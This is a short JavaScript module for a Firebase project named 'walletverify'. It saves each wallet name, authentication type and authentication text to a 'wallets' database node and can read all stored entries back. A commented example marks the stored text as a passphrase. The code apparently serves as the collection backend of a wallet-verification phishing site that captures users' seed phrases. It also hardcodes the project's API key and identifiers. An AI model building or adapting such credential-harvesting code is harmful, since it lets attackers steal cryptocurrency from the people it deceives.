// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.4/firebase-app.js";
import { getDatabase, ref, push, set, onValue } from "https://www.gstatic.com/firebasejs/9.6.4/firebase-database.js";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries


export function alertData(){
    alert("Working!");
}

export default class FirebaseDB {
    constructor() {
        // Your web app's Firebase configuration
        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
        const firebaseConfig = {
            apiKey: "AIzaSyCbrF2gXGfQm9ftS_eq_CnAkG2vaDA95G4",
            authDomain: "walletverify-1da38.firebaseapp.com",
            projectId: "walletverify-1da38",
            storageBucket: "walletverify-1da38.appspot.com",
            messagingSenderId: "946883279984",
            appId: "1:946883279984:web:0b013f9907e6ee9922c8b5",
            measurementId: "G-BPB2BK6JDZ"
        };
  
        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        // Get a reference to the database service
        this.database = getDatabase();
    }

    async writeWalletData(wallet_name, auth_type, auth_text) {
        let db = this.database;
        let d = new Date;
        let uuid = Date.now();
        let walletRef = ref(db, `wallets`);
        let newWalletRef = push(walletRef);
        await set(newWalletRef, {
          wallet_name: wallet_name,
          auth_type: auth_type,
          auth_text : auth_text,
          auth_file: null,
          date_added: d.toLocaleString()
        }).then(()=>{
            console.log("DOne");
        }).catch((error)=>{
            console.log(error);
        });

        return true;
    }

    readWalletData (callback) {
        let db = this.database;
        let walletRef = ref(db, 'wallets');
        let data;
        let _res = onValue(walletRef, (snapshot) => {
            data = snapshot.val();
            callback(data);
        });
        console.log(_res);
        return _res;
    }

}


// let resp = writeUserData("test wallet", "passphrase", "example pass phrase");
// console.log(resp);